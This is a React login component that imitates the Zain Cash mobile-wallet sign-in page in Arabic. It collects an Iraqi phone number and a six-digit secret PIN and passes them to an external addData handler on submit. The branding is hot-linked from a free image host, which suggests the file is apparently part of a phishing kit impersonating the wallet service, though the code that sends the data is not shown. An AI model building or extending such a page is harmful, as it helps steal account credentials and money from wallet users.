import React, { useEffect, useState } from "react";

const MainPage = (props: any) => {
  const [show, setShow] = useState(true);

  useEffect(() => {
    if (show) {
      setTimeout(() => setShow(false), 3000);
    }
  }, []);
  return (
    <div
      style={{
        background: show ? "rgba(22,0,0,0.5)" : "",
        height: "100vh",
        width: "100%",
      }}
    >
      <div
        className="title"
        style={{
          position: "absolute",
          left: 12,
          top: 20,
        }}
      >
        <img width={25} src="https://i.ibb.co/bPfYD6g/support.png" alt="logo" />
      </div>
      <div
        className="title"
        style={{
          position: "absolute",
          right: 12,
          top: 20,
        }}
      >
        <img
          width={25}
          src="https://i.ibb.co/ZHYbJRG/world-wide-web.png"
          alt="logo"
        />
      </div>
      <div
        className=""
        style={{ position: "fixed", top: "0%", left: "8%", right: "8%" }}
      >
        <div
          className="title"
          style={{
            color: "white",
            textAlign: "center",
            paddingBottom: 10,
            marginTop: 25,
          }}
        >
          <img
            width={100}
            src="https://i.ibb.co/cJpZcJS/655c6a8f1f13863139ccedfd-1200x630wa-veed-remove-background-p-500.png"
            alt="logo"
          />
        </div>
        <div
          style={{
            color: "white",
            textAlign: "center",
            margin: 20,
          }}
        >
          <h2>اهلا بك</h2>
        </div>
        <div
          className="title"
          style={{
            color: "white",
            textAlign: "center",
            paddingBottom: 10,
            margin: 20,
            fontSize: 13,
            fontWeight: 500,
          }}
        >
          تسجيل الدخول من خلال محفظة زين كاش
        </div>

        <form className="form" style={{}}>
          <div style={{ display: "flex", flexDirection: "column" }}>
            <label style={{ color: "gray", fontWeight: 600, fontSize: 13 }}>
              ادخل رقم الهاتف
            </label>

            <input
              placeholder="+964"
              dir="ltr"
              style={{
                padding: 1,
                margin: 10,
                height: 25,
                width: "70vw",
                border: "none",
                borderBottom: "#f1f1f1 1px solid",
              }}
              id="input1"
              type="tel"
              pattern="[0-9]{3}-[0-9]{4}-[0-9]{4}"
              maxLength={11}
              required
              onChange={(e) => props.setPhone(e.target.value)}
            />
            <label style={{ color: "gray", fontWeight: 600, fontSize: 13 }}>
              ادخل الرمز السري
            </label>
            <input
              placeholder="الرمز السري"
              style={{
                padding: 1,
                margin: 10,
                height: 25,
                width: "70vw",
                border: "none",
                borderBottom: "#f1f1f1 1px solid",
              }}
              id="input2"
              type="password"
              maxLength={6}
              required
              onChange={(e) => props.setPass(e.target.value)}
            />
          </div>
          <div
            style={{
              position: "absolute",
              left: 11,
              bottom: 100,
              marginTop: 15,
              fontSize: 12,
            }}
          >
            <u>هل نسيت الرمز السري؟</u>
          </div>
          <div>
            <button
              className="action"
              type="submit"
              onClick={(e: any) => {
                props.handleActivePage(2);
                props.addData();
              }}
            >
              تسجيل الدخول
            </button>
            <div style={{ marginTop: 13, fontSize: 13, fontWeight: 600 }}>
              {" "}
              غير مسجل مع خدمة زين كاش ؟
            </div>
          </div>
        </form>
      </div>
    </div>
  );
};
export default MainPage;
